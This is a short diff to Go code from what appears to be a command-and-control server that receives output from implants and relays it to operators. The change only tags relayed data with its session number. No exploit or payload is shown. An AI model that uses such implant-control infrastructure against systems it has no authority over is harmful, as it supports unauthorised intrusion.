@@ -88,7 +88,6 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 	// Get the Remote Address of the Implant from the request
 	remoteAddr := r.RemoteAddr
 
-
 	// Check GET URL parameters and handle errors
 	if len(getParams["psk"]) > 0 {
 		getPSK = getParams["psk"][0]
@@ -340,7 +339,7 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 					core.LogData("Session " + strconv.Itoa(getActiveSession) + " returned:\n" + data)
 
 					currentWolf := core.Wolves[CurrentOperator]
-					jsonData := `{"data":"` + data + `"}`
+					jsonData := `{"session":"` + strconv.Itoa(getActiveSession) + `",` + `"data":"` + data + `"}`
 					core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
 
 				} else {
